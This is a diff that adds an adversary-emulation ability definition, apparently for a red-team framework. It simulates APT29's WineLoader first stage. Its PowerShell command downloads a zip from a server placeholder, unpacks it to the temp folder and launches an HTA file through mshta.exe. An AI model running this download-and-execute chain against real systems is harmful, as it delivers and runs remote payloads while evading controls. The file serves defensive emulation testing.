@@ -1,0 +1,35 @@
+- id: wineloader-stage1-hta
+  name: WineLoader Stage 1 – HTA Delivery (Clean)
+  description: Simulating APT29 download pattern using PowerShell.
+  tactic: execution
+  technique_id: T1218.005
+  technique_name: "Signed Binary Proxy Execution: MSHTA"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $ErrorActionPreference = "Stop";
+          $zip = "$env:TEMP\legal_doc.zip";
+          $dir = "$env:TEMP\apt29_stage";
+
+          # Manual download simulation
+          try {
+              $headers = @{"file"="legal_doc.zip"};
+              Invoke-WebRequest -Uri "#{server}/file/download" -Headers $headers -OutFile $zip;
+              
+              if (Test-Path $zip) {
+                  if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
+                  Expand-Archive -Path $zip -DestinationPath $dir -Force;
+                  
+                  Start-Process "mshta.exe" -ArgumentList "`"$dir\invitation.hta`"";
+                  
+                  Write-Output "stage1_complete";
+              }
+          } catch {
+              Write-Error $_.Exception.Message;
+              exit 1;
+          }
+        payloads: []
+        parsers:
+          plugins.stockpile.app.parsers.line:
+            - source: apt29.wineloader.staged
